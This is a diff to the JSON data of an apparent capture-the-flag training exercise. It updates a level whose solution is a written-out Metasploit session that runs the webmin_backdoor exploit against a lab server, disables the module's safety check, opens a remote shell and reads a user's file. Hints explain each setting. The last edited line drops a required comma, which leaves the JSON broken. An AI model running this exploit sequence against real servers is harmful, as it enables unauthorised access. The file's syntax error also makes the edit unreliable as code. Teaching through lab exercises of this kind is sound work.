@@ -80,12 +80,12 @@
       "answer": null,
       "answer_variable_name": "level_2_flag",
       "content": "You correctly identified the vulnerable service running on the server. Now, exploit the vulnerable service to break through and access the server. One of the tools installed on your Attacker machine should help you in this regard.\n\nAfter you exploit the server, the remote shell might not be visible. Type `shell` and then work normally. *Keep an extra terminal window with this shell open for the rest of the game,* you will need it later.\n\nThe flag will be the first line of the file _/home/chong/READ-ME.txt_.",
-      "solution": "```\nroot@attacker:~# msfconsole\n\nmsf6 > use exploit/linux/http/webmin_backdoor\n\nmsf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.9\n\nmsf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.2.135.83\n\nmsf6 exploit(linux/http/webmin_backdoor) > set SSL true\n\nmsf6 exploit(linux/http/webmin_backdoor) > exploit\n\nshell\n\ncat /home/chong/READ-ME.txt\n```\n\nThe flag is: ${ANSWER}\n",
+      "solution": "```\nroot@attacker:~# msfconsole\n\nmsf6 > use exploit/linux/http/webmin_backdoor\n\nmsf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.9\n\nmsf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.2.135.83\n\nmsf6 exploit(linux/http/webmin_backdoor) > set SSL true\n\nmsf6 exploit(linux/http/webmin_backdoor) > set AutoCheck false\n\nmsf6 exploit(linux/http/webmin_backdoor) > exploit\n\nshell\n\ncat /home/chong/READ-ME.txt\n```\n\nThe flag is: ${ANSWER}\n",
       "solution_penalized": true,
       "hints": [
         {
           "title": "What are the correct options?",
-          "content": "RHOSTS needs to be set to the IP address of the server (**set RHOSTS 10.1.26.9**).\n\nLHOST needs to be set to 10.2.135.83 *because LHOST is the machine that initiates the exploit (you)* (**set LHOST 10.2.135.83**).\n\nSSL needs to be set to true, *because webmin runs on https by default* (**set SSL true**).",
+          "content": "RHOSTS needs to be set to the IP address of the server (**set RHOSTS 10.1.26.9**).\n\nLHOST needs to be set to 10.2.135.83 *because LHOST is the machine that initiates the exploit (you)* (**set LHOST 10.2.135.83**).\n\nSSL needs to be set to true, *because webmin runs on https by default* (**set SSL true**).\n\nAutoCheck needs to be set to false, *because the module's automatic vulnerability check fails against this server and stops the exploit before it runs* (**set AutoCheck false**).",
           "hint_penalty": 0,
           "order": 3
         },
@@ -103,7 +103,7 @@
         },
         {
           "title": "How should the exploit options be set?",
-          "content": "To successfully exploit the vulnerability, the parameters RHOSTS, LHOSTS and SSL need to be set to correct values (**set \"parameter\" \"value\"**). Once all the parameters are set, exploit the vulnerability.",
+          "content": "To successfully exploit the vulnerability, the parameters RHOSTS, LHOST, SSL and AutoCheck need to be set to correct values (**set \"parameter\" \"value\"**). Once all the parameters are set, exploit the vulnerability."
           "hint_penalty": 0,
           "order": 2
         }
